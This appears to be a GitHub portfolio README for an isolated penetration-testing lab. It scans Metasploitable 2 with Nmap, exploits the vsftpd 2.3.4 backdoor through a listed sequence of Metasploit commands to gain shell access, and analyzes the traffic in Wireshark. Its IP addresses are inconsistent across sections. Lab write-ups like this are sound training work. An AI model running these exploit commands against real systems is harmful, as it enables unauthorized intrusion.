# Penetration Testing Lab - Network Traffic Analysis & Exploitation 




## Overview
This project demonstrates a hands-on penetration testing lab environment designed to showcase cybersecurity and network analysis skills. Using Kali Linux, Metasploitable, and Wireshark, the lab involves setting up a secure and isolated environment, exploiting vulnerabilities, and analyzing captured traffic to gain actionable insights into network and system security.

The lab provides a detailed simulation of real-world penetration testing scenarios, focusing on identifying vulnerabilities, exploiting them, and monitoring the associated network activity. This project highlights the ability to use industry-standard tools to perform ethical hacking, assess security risks, and document findings in a professional manner.

<br>

## Tools & Technologies
#### Operating Systems
- Kali Linux (Attacker machine)
- Metasploitable 2 (Intentionally vulnerable target machine)



#### Penetration Testing Tools
- Metasploit Framework
- Nmap (Network Mapper)




#### Network Traffic Analysis
- Wireshark




#### Virtualization
- UTM

<br>

## Key Features & Processes
### 1. Lab Setup
Configured an isolated virtual environment with two VMs:
- Kali Linux: Attack machine with tools like Nmap, Metasploit, and Wireshark.
- Metasploitable 2: A vulnerable Linux-based system.
Assigned static IP addresses to the VMs for consistency in testing:
- Kali Linux: 172.31.12.240
- Metasploitable: 172.31.12.249
Ensured both VMs were connected via a Host-Only Network to simulate secure and controlled communication.




<br>

### 2. Vulnerability Scanning & Analysys
- Used Nmap to perform a detailed scan of Metasploitable to identify open ports and running services:
  - nmap -sV 192.168.12.240
- Analyzed the output to identify a vulnerable FTP service (vsftpd 2.3.4) running on port 21.
<br>

<img width="1724" alt="Screenshot 2025-01-14 at 11 47 57 AM" src="https://github.com/user-attachments/assets/2ebf8145-5b6e-412a-a278-44716951dc6e" />

<br>


<br>

### 3. Exploitation using Metasploit
- Loaded the vsftpd 2.3.4 backdoor exploit in Metasploit:
  - msfconsole
  - search vsftpd
  - use exploit/unix/ftp/vsftpd_234_backdoor
  - set RHOSTS 192.168.1.101
  - exploit
- Successfully exploited the vulnerability to gain unauthorized access to Metasploitable.

<img width="1723" alt="Screenshot 2025-01-14 at 11 48 17 AM" src="https://github.com/user-attachments/assets/58fb2503-604a-4744-8a15-15bca28441c6" /> <br>
<img width="1726" alt="Screenshot 2025-01-14 at 11 49 44 AM" src="https://github.com/user-attachments/assets/ac24de1c-3125-41fa-a3b3-ab46b81350d3" /> <br>

<img width="1719" alt="Screenshot 2025-01-14 at 11 52 12 AM" src="https://github.com/user-attachments/assets/8e4d80f0-6fd7-435f-910c-6845d4c4f493" /> <br>
<img width="1720" alt="Screenshot 2025-01-14 at 11 55 00 AM" src="https://github.com/user-attachments/assets/195a7123-5dc1-4b85-a16d-c67728fdf45c" />

<br>

### 4. Network Traffic Analysis
- Used Wireshark to monitor and capture network traffic during the exploitation process:
- Filtered traffic to focus on communication between 192.168.1.100 (Kali) and 192.168.1.101 (Metasploitable):
  - ip.addr == 172.31.12.240 && ip.addr == 172.31.12.249


- Observed TCP handshakes, FTP commands (USER and PASS), and exploit-related payloads.
- Identified cleartext credentials and unencrypted data transmitted during the attack.

<br>

## Value to Companies

#### Demonstrates Penetration Testing Expertise:
This project showcases the ability to simulate real-world attacks, identify vulnerabilities, and exploit them using industry-standard tools like Metasploit and Nmap.
#### Highlights Network Traffic Analysis Skills:
The use of Wireshark to monitor and analyze network traffic demonstrates proficiency in identifying security flaws such as unencrypted credentials and understanding attack patterns.
#### Enhances Security Awareness:
Provides insights into common vulnerabilities in legacy systems, emphasizing the importance of proactive vulnerability management and secure configurations.
#### Emphasizes Documentation and Reporting:
The structured approach to documenting findings ensures that stakeholders have clear, actionable insights into potential risks and remediation steps.

<br>

## Conclusion
This penetration testing lab serves as a valuable demonstration of cybersecurity skills, combining vulnerability identification, exploitation, and network analysis. By replicating real-world attack scenarios in a controlled environment, the project underscores the importance of securing systems, monitoring network traffic, and mitigating risks effectively.


